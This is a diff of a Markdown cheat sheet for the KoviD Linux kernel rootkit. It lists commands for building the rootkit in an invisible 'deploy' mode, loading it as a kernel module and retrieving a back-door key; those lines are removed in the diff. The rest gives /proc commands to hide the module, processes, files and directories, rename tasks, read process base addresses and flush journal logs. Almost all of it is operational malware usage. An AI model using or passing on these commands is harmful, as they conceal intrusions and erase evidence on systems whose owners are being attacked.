@@ -1,87 +1,11 @@
 # CheatSheet
 
-## Set PROCNAME
-
-*Action:* build
-
-*Mode:* debug,release
-
-*About:* Set `example` as proc UI: `/proc/example`
-
-*Root required:* No
-
-*Commands:*
-- `export PROCNAME=example`
-
-
-## Compile KoviD
-
-*Action:* build
-
-*Mode:* debug
-
-*About:* Logs go to `dmesg` output, rootkit is visible by default.
-
-*Root required:* No
-
-*Commands:*
-- `make`
-
-
-## Compile KoviD in DEPLOY mode
-
-*Action:* build
-
-*Mode:* deploy
-
-*About:* No logs to `dmesg`, rootkit is invisible.
-
-*Root required:* No
-
-*Commands:*
-- `DEPLOY=1 make`
-
-
-## Build Inject loader
-
-*Action:* build
-
-*Mode:* deploy
-
-*About:* Build `inject/` loaders.
-
-*Root required:* No
-
-*Commands:*
-- `DEPLOY=1 make`
-- `make strip`
-- `make -C inject/`
-
-
-## Load and Unload KoviD
-
-*Action:* run
-
-*Mode:* debug,deploy
-
-*About:* load module, unload module
-
-*Root required:* Yes
-
-*Commands:*
-- `sudo insmod ./kovid.ko`
-- `sudo rmmod ./kovid.ko`
-
 
 ## proc UI visibility
 
 *Action:* run
 
-*Mode:* debug,deploy
-
 *About:* to switch proc UI on/off repeat command
-
-*Root required:* No
 
 *Commands:*
 - `kill -CONT 31337`
@@ -91,15 +15,14 @@
 
 *Action:* run
 
-*Mode:* debug
+*Mode:* debug,deploy
 
 *About:* hide module
 
-*Root required:* No
+*Root required:* debug No, deploy Yes
 
 *Commands:*
 - `echo hide-lkm >/proc/example`
-- `cat /proc/example`
 
 
 ## KoviD visibility
@@ -190,30 +113,15 @@
 - `cat /proc/example`
 
 
-## get back-door KEY
-
-*Action:* UI
-
-*Mode:* debug
-
-*About:* get back-door KEY
-
-*Root required:* No
-
-*Commands:*
-- `echo get-bdkey >/proc/example`
-- `cat /proc/example`
-
-
 ## Hide process (PID)
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
-*About:* to hide/unhide PID 1234, repeat command
+*About:* to hide/unhide tasks, example PID `1234`
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo 1234 >/proc/example`
@@ -223,11 +131,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Hide a file
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo hide-file=README.txt >/proc/example`
@@ -237,11 +145,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Hide a file
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo hide-file=/home/user/README.txt >/proc/example`
@@ -251,11 +159,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Hide a file
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo hide-file-anywhere=README.txt >/proc/example`
@@ -265,11 +173,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Hide a file
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo hide-directory=dir1 >/proc/example`
@@ -279,11 +187,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Unhide a directory
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo hide-directory=/home/some-user/dir1 >/proc/example`
@@ -293,11 +201,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Hide a directory
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo unhide-directory=dir1 >/proc/example`
@@ -322,11 +230,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Rename PID 1234 task to `newtaskname`
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo rename-task=1234,newtaskname >/proc/example`
@@ -366,11 +274,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* Fetch process base-address of PID 1234
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo base-address=1234 >/proc/example`
@@ -381,11 +289,11 @@
 
 *Action:* UI
 
-*Mode:* debug,release
+*Mode:* debug,deploy
 
 *About:* flush journal logs
 
-*Root required:* debug=No, release=Yes
+*Root required:* debug=No, deploy=Yes
 
 *Commands:*
 - `echo journal-flush >/proc/example`
